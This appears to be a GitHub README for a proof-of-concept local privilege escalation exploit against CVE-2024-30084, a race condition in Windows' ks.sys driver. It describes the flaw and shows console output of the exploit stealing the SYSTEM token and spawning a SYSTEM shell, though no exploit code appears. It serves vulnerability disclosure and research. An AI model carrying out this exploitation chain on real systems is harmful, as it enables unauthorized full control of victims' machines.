# CVE-2024-30084

**Title:** Windows Kernel-Mode Driver Elevation of Privilege Vulnerability  
**CVE-2024-30084:** https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30084  
**Vulnerability Type:** Time-of-check Time-of-use (TOCTOU) Race Condition  
**Tested On:** ks.sys - 10.0.22621.2506    

## Description

CVE-2024-30084 is a privilege escalation vulnerability in the Microsoft Kernel Streaming driver (`ks.sys`) caused by a race condition in how user-supplied data is handled. The driver performs a second, unchecked read of a buffer after it has already been validated, introducing a time-of-check to time-of-use (TOCTOU) flaw. This allows modification of the input between the two accesses, leading the kernel to dereference attacker-controlled pointers and potentially execute arbitrary code in kernel mode, resulting in elevation of privileges to SYSTEM.

## Exploit

Tested on: Windows 11 23H2 (05-2024 Build)

```
PS C:\Users\h4x\Desktop> whoami
desktop-3rgmcon\h4x
PS C:\Users\h4x\Desktop> .\CVE-2024-30084.exe
[+] Successfully opened internal topology of an audio device!
[+] NT base address fffff8010fe00000
[+] Found EPROCESS of the current process FFFFD70BF11E70C0
[+] Found KTHREAD of the current thread FFFFD70BED9A4080
[+] Found EPROCESS of the system.exe FFFFD70BEA104040
[+] pFakeBitmapAddr = 0x0000000010000000
[+] Beginning race condition...
[+] Calling Kernel Streaming....
[+] Stealing system's Token..
[+] Replacing KTHREAD.PreviousMode as UserMode..
[+] Spawning shell as SYSTEM...
Microsoft Windows [Version 10.0.22631.3593]
(c) Microsoft Corporation. All rights reserved.

C:\Users\h4x\Desktop>whoami
nt authority\system
```

## Acknowledgements

- The original research on Kernel Streaming was conducted by [Angelboy](https://x.com/scwuaptx), and it can be found [here](https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/).
- The [PoC](https://github.com/varwara/CVE-2024-35250/) was developed by Varwara, and the above PoC is based on it.
